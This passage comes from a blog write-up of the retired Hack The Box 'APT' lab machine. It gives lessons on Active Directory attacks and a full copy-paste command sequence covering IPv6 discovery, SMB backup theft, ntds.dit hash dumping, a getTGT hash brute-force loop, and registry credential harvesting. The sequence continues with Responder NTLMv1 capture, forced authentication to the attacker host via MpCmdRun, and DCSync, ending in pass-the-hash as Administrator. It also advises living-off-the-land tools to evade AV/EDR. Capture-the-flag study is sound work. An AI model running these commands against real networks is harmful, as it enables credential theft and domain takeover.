+<p>Extracting <code>ntds.dit</code> from a backup gives you thousands of hashes, but they may be stale. Always validate hashes against live services (Kerbrute, getTGT, crackmapexec) before assuming they work.</p>
+<h3 id="3-kerberos-is-your-friend">3. Kerberos Is Your Friend</h3>
+<p>Even when you don't have a valid password, a valid hash can forge a Kerberos TGT. The <code>getTGT</code> brute force technique is powerful for testing which stale hashes are still live.</p>
+<h3 id="4-registry-credential-harvesting">4. Registry Credential Harvesting</h3>
+<p>Applications love storing credentials in the registry. Once you have any level of access (even a Kerberos ticket for a regular user), dump <code>HKU</code> and search for keywords like <code>UserName</code>, <code>PassWord</code>, <code>Password</code>, <code>Credential</code>.</p>
+<h3 id="5-ntlmv1-is-critical-vulnerability">5. NTLMv1 Is Critical Vulnerability</h3>
+<p>A single registry change (<code>lmcompatibilitylevel = 2</code>) downgrades the entire machine to NTLMv1. This allows offline cracking of authentication responses. If you see this setting in PowerShell history or registry, immediately plan a Responder attack.</p>
+<h3 id="6-living-off-the-land">6. Living Off the Land</h3>
+<p>Instead of uploading exploits, use built-in Windows tools (<code>MpCmdRun.exe</code>, <code>certutil</code>, <code>bitsadmin</code>, etc.) to force authentication or download files. This avoids AV/EDR detection and is often more reliable.</p>
+<h3 id="7-computer-accounts-are-domain-admins-in-disguise">7. Computer Accounts Are Domain Admins in Disguise</h3>
+<p>The <code>APT$</code> computer account has DCSync privileges because it's a domain controller. Never ignore computer accounts — they can be as powerful as Administrator.</p>
+<hr />
+<h2 id="full-command-reference-copy-paste">Full Command Reference (Copy-Paste)</h2>
+<pre><code class="language-bash" data-language="bash"># Step 1-2: IPv6 Discovery
+echo "10.129.96.60 apt.htb" | sudo tee -a /etc/hosts
+git clone https://github.com/mubix/IOXIDResolver.git
+python3 IOXIDResolver/IOXIDResolver.py -t 10.129.96.60
+
+# Step 3: IPv6 Scan &amp; Hosts
+sudo sed -i '/apt.htb/d' /etc/hosts
+echo "dead:beef::b885:d62a:d679:573f apt.htb apt.htb.local htb.local" | sudo tee -a /etc/hosts
+sudo nmap -6 --min-rate 3000 -p- -Pn -T4 -v apt.htb
+
+# Step 4: SMB
+smbclient -L \\apt.htb -N
+smbclient \\apt.htb\backup -N
+# smb: \&gt; get backup.zip
+
+# Step 5: ZIP Crack &amp; Extract
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
+unzip backup.zip
+
+# Step 6: Hash Dump
+cp "Active Directory/ntds.dit" .
+cp registry/SYSTEM .
+impacket-secretsdump -ntds ntds.dit -system SYSTEM -outputfile user_hashes LOCAL
+
+# Step 7: Kerbrute
+cat user_hashes.ntds | cut -d':' -f1 | sort -u &gt; users.txt
+kerbrute userenum -d htb.local --dc apt.htb.local -o kerbrute.txt users.txt
+
+# Step 8: getTGT Brute Force
+cat user_hashes.ntds | awk -F':' '{printf "%s:%s\n",$3,$4}' | sort -u &gt; hashes.txt
+for i in $(cat hashes.txt); do
+    rm -f *.ccache 2&gt;/dev/null
+    impacket-getTGT HTB.local/henry.vinson@apt.htb -hashes $i &gt;/dev/null 2&gt;&amp;1
+    if ls *.ccache 1&gt;/dev/null 2&gt;&amp;1; then
+        echo "HASH FOUND: [$i]"
+        break
+    fi
+done
+
+# Step 9: Registry Dump
+export KRB5CCNAME=henry.vinson@apt.htb.ccache
+impacket-reg -k apt.htb.local query -keyName HKU -s &gt; registry.txt
+cat registry.txt | grep -i -A2 -B2 "henry"
+
+# Step 10: User Shell
+evil-winrm -i apt.htb -u henry.vinson_adm -p REDACTED
+# cat C:\Users\henry.vinson_adm\Desktop\user.txt
+
+# Step 12: Responder (on Kali)
+sudo sed -i 's/Challenge = .*/Challenge = 1122334455667788/' /etc/responder/Responder.conf
+sudo responder --lm -I tun0
+
+# Step 12: Defender scan (in evil-winrm)
+cd "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0"
+.\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.17.27\file.txt
+
+# Step 14: Secretsdump as APT$
+impacket-secretsdump -hashes [redacted retired-lab hash or flag]:[redacted retired-lab hash or flag] 'HTB.local/APT$@apt.htb'
+
+# Step 15: Admin Shell
+evil-winrm -i apt.htb -u Administrator -H [redacted retired-lab hash or flag]
+# cat C:\Users\Administrator\Desktop\root.txt
+</code></pre>
+<hr />
+<p><em>Walkthrough written for the APT machine on Hack The Box. Target: 10.129.96.60 | Attacker: 10.10.17.27</em></p>
+9:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$e"}}]
+a:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-multimaster-walkthrough","children":[["$","span",null,{"children":"Newer article"}],["$","strong",null,{"children":"Hack The Box: Multimaster Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",114," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-crossfittwo-walkthrough","children":[["$","span",null,{"children":"Older article"}],["$","strong",null,{"children":"Hack The Box: CrossFitTwo Walkthrough"}]]}]}]]}]
+b:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Public profiles","children":[["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Hack The Box",{"href":"https://app.hackthebox.com/public/users/349278","target":"_blank","rel":"noreferrer","children":["Hack The Box"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credential wallet",{"href":"https://www.credential.net/profile/cyberkareem/wallet","target":"_blank","rel":"noreferrer","children":["Credential wallet"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credly",{"href":"https://www.credly.com/users/cyberkareem/badges","target":"_blank","rel":"noreferrer","children":["Credly"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Evidence-led research · authorized assessment"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+f:T4fb,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-apt-walkthrough/#article","headline":"Hack The Box: APT Walkthrough","description":"An archived walkthrough of the retired Hack The Box APT machine, preserved from Abdullah Kareem's OSEP Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-apt-walkthrough/","datePublished":"2026-06-11T15:56:07.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":3044,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSEP-Prep/blob/71e1e57087c98e9da9d75acf451b6e760a661d0b/HTB-APT.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-apt-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-apt-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: APT Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-apt-walkthrough/"}]}]}c:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$f"}}]
+d:["$","$L10",null,{"children":["$","$11",null,{"name":"Next.MetadataOutlet","children":"$@12"}]}]
+12:null
